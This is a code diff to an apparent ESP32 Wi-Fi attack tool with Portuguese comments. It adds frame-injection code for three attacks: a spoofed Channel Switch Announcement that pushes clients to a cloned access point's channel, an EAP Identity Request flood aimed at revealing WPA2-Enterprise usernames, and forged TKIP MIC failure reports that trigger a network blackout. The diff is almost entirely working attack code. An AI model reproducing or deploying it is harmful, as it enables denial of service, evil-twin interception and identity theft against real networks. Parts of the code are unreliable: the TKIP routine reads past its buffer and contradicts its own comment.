@@ -20,7 +20,12 @@ public:
     bool assocFlood      = false; // Inunda tabela de associação do AP
     bool nullFrames      = true;  // Envia null-function com PM=1 (power-save trick)
     bool reconnectBlock  = false; // Probe Response flood falso — impede cliente de reconectar
-    char targetSSID[33]  = {};    // SSID do AP alvo (para reconnectBlock)
+    bool csaMode         = false; // Channel Switch Announcement — move clientes para outro canal
+    bool eapFlood        = false; // EAP Identity Request flood — confunde supplicants
+    bool tkipInjection   = false; // Envia EAPOL-Key com MIC failure (reason 0x0E) — TKIP countermeasure
+    uint8_t csaChannel   = 13;    // Canal destino para CSA attack
+    uint8_t csaCount     = 5;     // Contagem regressiva CSA (frames até troca)
+    char targetSSID[33]  = {};    // SSID do AP alvo (para reconnectBlock/CSA)
 
     uint8_t targetAP[6]     = {0};
     uint8_t targetClient[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
@@ -62,6 +67,9 @@ public:
                  (pmfBypass       ? " +PMF"     : "") +
                  (assocFlood      ? " +ASSOC"   : "") +
                  (reconnectBlock  ? " +REBLOCK" : "") +
+                 (csaMode         ? " +CSA→ch" + String(csaChannel) : "") +
+                 (eapFlood        ? " +EAP"    : "") +
+                 (tkipInjection   ? " +TKIP"   : "") +
                  (autoC ? " [AUTO-CAPTURE]" : ""));
     }
 
@@ -166,6 +174,32 @@ private:
         // Cliente pós-deauth fica tentando se associar ao AP falso em vez do real
         if (reconnectBlock && targetSSID[0] != 0 && !broadcastMode) {
             _sendReconnectBlock(targetClient, targetSSID, channel);
+            framesSent++;
+        }
+
+        // CSA Attack: Channel Switch Announcement
+        // Injeta Action frames + beacons falsos ordenando todos os clientes
+        // a mudar para csaChannel — canal onde controlamos o AP clone
+        if (csaMode) {
+            for (int r = 0; r < 3; r++) {
+                _sendCSAAction(targetAP, csaChannel, csaCount > r ? csaCount - r : 1);
+                framesSent++;
+            }
+        }
+
+        // EAP Identity Request flood: envia pedidos de identidade EAP falsos
+        // Confunde supplicants WPA2-Enterprise e pode revelar identidades (username)
+        if (eapFlood && !broadcastMode) {
+            for (int i = 0; i < 4; i++) {
+                _sendEAPIdentityRequest(targetAP, targetClient);
+                framesSent++;
+            }
+        }
+
+        // TKIP MIC Failure injection: reporta falha MIC falsa do cliente ao AP
+        // Aciona countermeasures TKIP (60s blackout) em redes WPA-TKIP legadas
+        if (tkipInjection && !broadcastMode) {
+            _sendTKIPMicFailure(targetAP, targetClient);
             framesSent++;
         }
     }
@@ -291,6 +325,80 @@ private:
         memcpy(f + off, rates, 8); off += 8;
         f[off++] = 0x03; f[off++] = 0x01; f[off++] = ch;
         esp_wifi_80211_tx(WIFI_IF_AP, f, off, false);
+    }
+
+    // CSA Action frame (Spectrum Management, category=0, action=4)
+    // Força clientes a migrarem para newCh com contagem regressiva
+    void _sendCSAAction(const uint8_t* ap, uint8_t newCh, uint8_t count) {
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        uint8_t f[38] = {};
+        f[0] = 0xD0; f[1] = 0x00; // Action
+        f[2] = 0x3A; f[3] = 0x01;
+        memcpy(f+4,  bcast, 6);   // DA broadcast
+        memcpy(f+10, ap,    6);   // SA = AP alvo (spoofado)
+        memcpy(f+16, ap,    6);   // BSSID = AP alvo
+        uint16_t sq = _nextSeq();
+        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
+        f[24] = 0x00; // Category: Spectrum Management
+        f[25] = 0x04; // Action: Channel Switch Announcement
+        // CSA IE (tag 37, len 3)
+        f[26] = 0x25; f[27] = 0x03;
+        f[28] = 0x01; // Mode=1 (parar tx antes de trocar)
+        f[29] = newCh;
+        f[30] = count;
+        // Extended CSA IE (tag 60) para 802.11n+
+        f[31] = 0x3C; f[32] = 0x03;
+        f[33] = 0x01; f[34] = newCh; f[35] = count;
+        // Secondary Channel Offset IE (tag 62) - nao ha secundario
+        f[36] = 0x3E; f[37] = 0x01; // len=1, offset=0
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 38, true);
+    }
+
+    // EAP Identity Request — frame LLC/SNAP + EAPOL + EAP Request Identity
+    // Enviado unicast do AP para o cliente (spoofado)
+    void _sendEAPIdentityRequest(const uint8_t* ap, const uint8_t* cli) {
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        if (memcmp(cli, bcast, 6) == 0) return;
+        // Data frame QoS com payload LLC/SNAP EAPOL
+        uint8_t f[50] = {};
+        f[0] = 0x88; f[1] = 0x02; // QoS Data, FromDS=1
+        f[2] = 0x00; f[3] = 0x00;
+        memcpy(f+4,  cli, 6);  // DA = client
+        memcpy(f+10, ap,  6);  // SA = AP
+        memcpy(f+16, ap,  6);  // BSSID = AP
+        f[22] = 0x00; f[23] = 0x00; // seq
+        f[24] = 0x00; f[25] = 0x00; // QoS control
+        // LLC/SNAP
+        f[26] = 0xAA; f[27] = 0xAA; f[28] = 0x03;
+        f[29] = 0x00; f[30] = 0x00; f[31] = 0x00;
+        f[32] = 0x88; f[33] = 0x8E; // EtherType EAPOL
+        // EAPOL: ver=1, type=0 (EAP Packet), len=5
+        f[34] = 0x01; f[35] = 0x00; f[36] = 0x00; f[37] = 0x05;
+        // EAP: code=1 (Request), id=1, len=5, type=1 (Identity)
+        f[38] = 0x01; f[39] = 0x01; f[40] = 0x00; f[41] = 0x05; f[42] = 0x01;
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 43, false);
+    }
+
+    // TKIP MIC Failure Report: finge que o cliente detectou uma falha MIC
+    // Aciona TKIP Countermeasures no AP (60s bloqueio) — apenas para WPA-TKIP legado
+    void _sendTKIPMicFailure(const uint8_t* ap, const uint8_t* cli) {
+        const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+        if (memcmp(cli, bcast, 6) == 0) return;
+        // Action frame: category=14 (WPA), action=0 (MIC Failure Report)
+        uint8_t f[32] = {};
+        f[0] = 0xD0; f[1] = 0x00;
+        f[2] = 0x3A; f[3] = 0x01;
+        memcpy(f+4,  ap,  6); // DA = AP (enviamos do cliente para o AP)
+        memcpy(f+10, cli, 6); // SA = cliente (spoofado)
+        memcpy(f+16, ap,  6); // BSSID = AP
+        uint16_t sq = _nextSeq();
+        f[22] = sq & 0xFF; f[23] = (sq >> 8) & 0xFF;
+        f[24] = 0x0E; // Category: WPA
+        f[25] = 0x00; // Action: MIC Failure Report
+        f[26] = 0x01; // key type: group
+        // TSC (Timestamp Counter) aleatório
+        esp_fill_random(f+27, 6);
+        esp_wifi_80211_tx(WIFI_IF_AP, f, 33, true);
     }
 
     // Auth Request de MAC aleatório → enche tabela de autenticação do AP
